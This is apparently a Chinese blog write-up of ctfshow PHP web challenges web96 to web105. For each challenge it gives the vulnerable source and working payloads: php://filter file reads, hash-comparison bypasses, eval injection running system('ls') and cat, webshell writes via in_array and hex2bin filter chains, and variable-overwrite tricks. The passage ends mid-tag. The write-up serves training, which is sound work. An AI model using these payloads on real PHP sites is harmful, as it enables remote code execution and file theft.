        <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>记录以前刷过的CTF题</p><h4 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>传入目标路径</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>() 函数</span><br><span class="line">对文件进行语法高亮显示</span><br><span class="line">语法</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(filename,<span class="keyword">return</span>)</span><br><span class="line">返回值</span><br><span class="line">如果 <span class="keyword">return</span> 参数被设置为 <span class="literal">true</span>，那么该函数会返回被高亮处理的代码，而不是输出它们。否则，若成功，则返回 <span class="literal">true</span>，失败则返回 <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">var</span>/www/html/flag.php              绝对路径</span><br><span class="line">./flag.php                          相对路径</span><br><span class="line">php:<span class="comment">//filter/resource=flag.php      php伪协议 </span></span><br><span class="line"></span><br><span class="line">?u=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h4><p>md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是强相等的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>payloa</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure><h4 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;<span class="comment">//如果$_GET存在则$_GET值引用$_POST的值</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;<span class="comment">//如果post里的flag的值为flag则引用$_COOKIE</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);<span class="comment">//如果post里的HTTP_FLAG的值为flag则返回$flag</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>三目运算和 &amp;取地址的考察</p><p>思路：</p><p>在get随便传入一个值，post里传入HTTP_FLAG&#x3D;flag</p><p>实际上就看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><h4 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$allow</span>, <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[‘n‘]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[‘n‘], <span class="variable">$allow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[‘n‘], <span class="variable">$_POST</span>[‘content‘]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>首先是定义一个数组，然后向数组里面插入随机数，当GET传参的内容符合数组里随机数时，向传参名字的文件里写入POST的content内容</p><p>&#x2F;&#x2F;in_array()函数有漏洞 没有设置第三个参数 就可以形成自动转换&#96;</p><p>&#x2F;&#x2F;eg:n&#x3D;1.php自动转换为1 </p><p>就是说in_array()的type没有设置为true，则不存在的值会不检测，自动转换,相当于沿用了php的&#x3D;&#x3D;，弱比较</p><p>所以默认是弱类型比较，碰运气试数字.php，比如1.php，运气好就可以写进马。</p><p><img src="https://s1.vika.cn/space/2023/02/22/df67fb7dc9bc4b44b46f3bc7ef7cda2e" alt="image-20211003214756991"></p><p><img src="https://s1.vika.cn/space/2023/02/22/cbabfea48a26400582e5640011760f94" alt="image-20211003214814493"></p><p><img src="https://s1.vika.cn/space/2023/02/22/04e653d4a61d41749e456948e7329285" alt="image-20211003214840929"></p><h4 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v2</span>))&#123;<span class="comment">#v2没有;v3有;</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);<span class="comment">#中间的(&#x27;ctfshow&#x27;)是没有用的</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><img src="https://s1.vika.cn/space/2023/02/22/6c14a667d0174650afb89d7ece98f66b" alt="image-20211003221505167"></p><p>所以我们只要让v1是is_numeric就可以了。<br> 这题的预期解是利用PHP中的反射类ReflectionClass，因为已经提示了flag在ctfshow这个类里，</p><p>关于反射类</p><p>参考：<a href="https://www.cnblogs.com/benbenhan/p/12572649.html">https://www.cnblogs.com/benbenhan/p/12572649.html</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.常量 Contants</span><br><span class="line"><span class="number">2</span>.属性 Property Names</span><br><span class="line"><span class="number">3</span>.方法 Method Names静态</span><br><span class="line"><span class="number">4</span>.属性 Static Properties</span><br><span class="line"><span class="number">5</span>.命名空间 Namespace</span><br><span class="line"><span class="number">6</span>.Person类是否为<span class="keyword">final</span>或者<span class="keyword">abstract</span></span><br><span class="line"><span class="number">7</span>.Person类是否有某个方法</span><br><span class="line"><span class="number">8</span>.获取注释：getDocComment</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$flag</span>=<span class="string">&quot;flag&#123;123123123&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">const</span>  PI=<span class="number">3.14</span>;</span><br><span class="line"><span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&#x27;A&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getConstants</span>());  获取一组常量</span><br><span class="line">输出</span><br><span class="line"> <span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;PI&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">float</span>(<span class="number">3.14</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getName</span>());    获取类名</span><br><span class="line">输出</span><br><span class="line"><span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;A&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getStaticProperties</span>()); 获取静态属性</span><br><span class="line">输出</span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;flag&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">15</span>) <span class="string">&quot;flag&#123;123123123&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getMethods</span>()); 获取类中的方法</span><br><span class="line">输出</span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">object</span>(ReflectionMethod)<span class="comment">#2 (2) &#123;</span></span><br><span class="line">    [<span class="string">&quot;name&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;hello&quot;</span></span><br><span class="line">    [<span class="string">&quot;class&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;A&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">v1=<span class="number">1</span>&amp;v2=<span class="keyword">echo</span> <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>&amp;v3=;<span class="comment">#它是用来导出或提取出关于类、方法、属性、参数等的详细信息，包括注释。</span></span><br><span class="line">v1=<span class="number">1</span>&amp;v2=<span class="title function_ invoke__">var_dump</span>(<span class="variable">$ctfshow</span>)<span class="comment">/*&amp;v3=*/</span>;<span class="comment">#为什么要用/**/，因为var_dump是php执行代码，需要把后面v3注释，免得报错</span></span><br><span class="line">v1=<span class="number">1</span>&amp;v2=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="keyword">echo</span> `ls`<span class="meta">?&gt;</span><span class="comment">/*&amp;v3=;*/</span>  <span class="comment">#v2最前面的?&gt;是用来闭合php代码</span></span><br><span class="line">v1=<span class="number">1</span>&amp;v2=-<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>)-&amp;v3=-<span class="number">1</span>;</span><br><span class="line">v1=<span class="number">1</span>&amp;v2=<span class="keyword">echo</span>&amp;v3=;<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line">v1=<span class="number">1</span>&amp;v2=&amp;v3=<span class="meta">?&gt;</span><span class="meta">&lt;?=</span>`cat ctfshow.php`; <span class="comment">//反引号执行命令</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>知识点<br> 三种注释方式</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.<span class="comment">//是单行注释，有java，c，php</span></span><br><span class="line"><span class="number">2</span>.<span class="comment">#也可以注释，有python，php</span></span><br><span class="line"><span class="number">3</span>.<span class="comment">/**/</span>多行注释，有php，java</span><br></pre></td></tr></table></figure><p><img src="https://s1.vika.cn/space/2023/02/22/9312ddba79684282aaf393e2e20294da" alt="image-20211003224617093"></p><p><img src="https://s1.vika.cn/space/2023/02/22/ef7a20df8a2c4a78ab2a101270924a66" alt="image-20211003224725015"></p><p><img src="https://s1.vika.cn/space/2023/02/22/1b7e59e4f6fb4b0d979319f1cb0d7198" alt="image-20211003222524825"></p><p>最后还要替换0x2d（十六进制ASCII的‘-’符号）</p><h4 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h4><p>过滤了很多符号，不能用var_dump输出信息</p><p>v3没有过滤分号</p><p><img src="https://s1.vika.cn/space/2023/02/22/45b9644fef974afa918a8b42e2d36d97" alt="image-20211004105559189"></p><h4 id="web102-x2F-103"><a href="#web102-x2F-103" class="headerlink" title="web102&#x2F;103"></a>web102&#x2F;103</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);<span class="comment">#回凋$v1函数</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);<span class="comment">#向$v3写入字符</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>思路：v1是一个函数，v2是数字，v3是文本。我们要把一个命令给函数调用然后写入文本中执行，要绕过substr第二位截取，关键就是什么代码base64编码后再转为十六进制为全数字。</p><p>payloa</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?v2=<span class="number">115044383959474e6864434171594473</span>&amp;v3=php:<span class="comment">//filter/write=convert.base64-decode/resource=1.php</span></span><br><span class="line"><span class="comment">#115044383959474e6864434171594473解码后是&lt;?=`cat *`;</span></span><br><span class="line"> <span class="comment"># post</span></span><br><span class="line">v1=hex2bin</span><br><span class="line"></span><br><span class="line"><span class="comment">#访问1.php后查看源代码获得flag</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s1.vika.cn/space/2023/02/22/c529f321f48345cdafdd15b18639edfc" alt="image-20211004121131609"></p><p><img src="https://s1.vika.cn/space/2023/02/22/26f36ce45ece4e47b7abaddb89e52813" alt="image-20211004120323456"></p><p><img src="https://s1.vika.cn/space/2023/02/22/0ed64b99fcbc4c50a42fc1914eb1259d" alt="image-20211004120800938"></p><h4 id="web104-x2F-106"><a href="#web104-x2F-106" class="headerlink" title="web104&#x2F;106"></a>web104&#x2F;106</h4><p>sha1() 函数计算字符串的 SHA-1 散列。</p><p>sha1()与md5一样，无法处理数组，可利用0e科学计数法达到伪相等</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">v1[]=<span class="number">1</span></span><br><span class="line">v2[]=<span class="number">2</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">v1=aaK1STf    <span class="comment">//0e7665852665575620768827115962402601</span></span><br><span class="line">v2=aaO8zKZF   <span class="comment">//0e89257456677279068558073954252716165</span></span><br><span class="line">    </span><br><span class="line">hash值相同</span><br><span class="line">aaroZmOk</span><br><span class="line">aaK1STfY</span><br><span class="line">aaO8zKZF</span><br><span class="line">aa3OFF9m</span><br></pre></td></tr></table></figure><h4 id="web105–变量覆盖"><a href="#web105–变量覆盖" class="headerlink" title="web105–变量覆盖"></a>web105–变量覆盖</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$error</span>=<span class="string">&#x27;你还想要flag嘛？&#x27;</span>;</span><br><span class="line"><span class="variable">$suces</span>=<span class="string">&#x27;既然你想要那给你吧！&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;<span class="comment">//键名不能是error</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;<span class="comment">//变量覆盖，意思就是$key的内容作为变量，例如：$key=xx，$$key=$xx</span></span><br><span class="line">&#125;<span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;<span class="comment">//键值不能是flag</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;<span class="comment">//不相等就die($error)</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$suces</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用变量覆盖</p><p>payloa</p><p>第一个if语句GET的值不能等于error，第二个if把flag过滤掉了。</p><p>可以把两个结合起来进行绕过先在GET里传入一个值为flag的变量然后在POST里获得从GET中传入的变量</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?suces=flag<span class="comment">#GET  $suces=$flag</span></span><br><span class="line">error=suces<span class="comment">#POST $error=$suces(此时，$flag的值就传给了$suces和$error)</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?Sn0w=flag</span><br><span class="line">DATA:</span><br><span class="line">error=Sn0w</span><br><span class="line">实际在代码中为</span><br><span class="line">GET:</span><br><span class="line"><span class="variable">$Sn0w</span>=<span class="variable">$flag</span></span><br><span class="line">POST:</span><br><span class="line"><span class="variable">$error</span>=<span class="variable">$Sn0w</span></span><br></pre></td></tr></table></figure><p>利用<code>($_POST[&#39;flag&#39;]!==$flag)</code>输出$error，这样就输出了$flag</p><p>利用</p><p>echo “your are good”.$flag.”\n”; </p><p>die($suces); </p><p>payload</p><p>传入的flag的值为空，所以满足$_POST[‘flag’]&#x3D;&#x3D;$flag这个条件，都为空，所以跳入下一个die函数，输出$suces变量（即$flag）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?suces=flag&amp;flag=</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">suces=flag</span><br><span class="line">DATA:</span><br><span class="line">flag=</span><br><span class="line">实际代码为：</span><br><span class="line">GET:</span><br><span class="line"><span class="variable">$suces</span>=<span class="variable">$flag</span></span><br><span 